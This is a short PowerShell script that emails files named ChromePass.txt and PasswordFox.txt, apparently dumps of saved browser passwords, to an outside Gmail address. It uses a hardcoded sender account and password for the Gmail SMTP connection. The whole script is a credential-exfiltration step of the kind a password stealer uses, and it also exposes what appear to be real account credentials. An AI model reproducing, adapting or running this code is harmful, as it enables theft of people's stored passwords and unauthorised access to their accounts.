$Username = "aaa290898@gmail.com";
$Password= "aaaaaa290898";
$path= "C:\chrome\ChromePass.txt"
$path2= "C:\chrome\PasswordFox.txt" 

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = $Username;
    $message.To.Add($email);
    $message.Subject = "Browser Password";
    $message.Body = "Here the password list";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $TRUE;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "abdulazies55@gmail.com" -attachmentpath $path, $path2;
